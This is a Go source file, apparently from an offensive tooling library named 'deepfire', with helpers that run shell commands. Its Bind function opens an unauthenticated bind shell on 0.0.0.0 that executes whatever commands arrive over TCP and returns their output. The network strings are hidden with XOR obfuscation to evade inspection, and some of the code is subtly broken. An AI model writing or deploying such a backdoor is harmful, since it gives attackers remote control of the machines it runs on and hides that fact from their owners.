package deepfire

import (
	"fmt"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
)

// CmdOut executes a given command and returns its output.
func CmdOut(command string) (string, error) {
	return cmdOut(command)
}

func PwshOut(command string) (string, error) {
	return pwsh(command)
}

// CmdOutPlatform executes a given set of commands based on the OS of the machine.
func CmdOutPlatform(commands map[string]string) (string, error) {
	cmd := commands[runtime.GOOS]
	out, err := CmdOut(cmd)
	if err != nil {
		return (func() string {
mask := []byte("")
maskedStr := []byte("")
res := make([]byte, 0)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), err
	}

	return out, nil
}

// CmdRun executes a command and writes output as well
// as error to STDOUT.
func CmdRun(command string) {
	parts := strings.Fields(command)
	head := parts[0]
	parts = parts[1:]
	cmd := exec.Command(head, parts...)
	output, err := cmd.CombinedOutput()
	if err != nil {
		PrintError(err.Error())
		fmt.Println(string(output))
	} else {
		fmt.Println(string(output))
	}
}

// CmdBlind runs a command without any side effects.
func CmdBlind(command string) {
	parts := strings.Fields(command)
	head := parts[0]
	parts = parts[1:]
	cmd := exec.Command(head, parts...)
	_, _ = cmd.CombinedOutput()
}

// CmdDir executes commands which are mapped to a string
// indicating the directory where the command is executed.
func CmdDir(dirs_cmd map[string]string) ([]string, error) {
	outs := []string{}
	for dir, cmd := range dirs_cmd {
		err := os.Chdir(dir)
		if err != nil {
			return nil, err
		}

		o, err := CmdOut(cmd)
		if err != nil {
			return nil, err
		}
		outs = append(outs, o)
	}

	return outs, nil
}

// Bind tells the process to listen to a local port
// for commands.
func Bind(port int) {
	listen, err := net.Listen((func() string {
mask := []byte("\x40\x74\xaf")
maskedStr := []byte("\x34\x17\xdf")
res := make([]byte, 3)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\x4a\xc8\xc0\xf5\xa4\x6f\x09\x6e")
maskedStr := []byte("\x7a\xe6\xf0\xdb\x94\x41\x39\x54")
res := make([]byte, 8)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())+strconv.Itoa(port))
	ExitOnError(err)
	defer listen.Close()

	for {
		conn, err := listen.Accept()
		if err != nil {
			PrintError((func() string {
mask := []byte("\xe8\x47\x7a\x77\x54\x30\x03\x8f\xc0\x0e\xac\x03\xaf\x4d\xdc\xd3\x25\xbd\x2b\x31\x31\x06\x34\x8a\x08\xb8\x64\x22")
maskedStr := []byte("\xab\x26\x14\x19\x3b\x44\x23\xed\xa9\x60\xc8\x23\xdb\x22\xfc\xa0\x40\xd1\x4e\x52\x45\x63\x50\xaa\x78\xd7\x16\x56")
res := make([]byte, 28)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()))
		}
		handleBind(conn)
	}
}

func handleBind(conn net.Conn) {
	for {
		buffer := make([]byte, 1024)
		length, _ := conn.Read(buffer)
		command := string(buffer[:length-1])
		out, _ := CmdOut(command)
		conn.Write([]byte(out))
	}
}
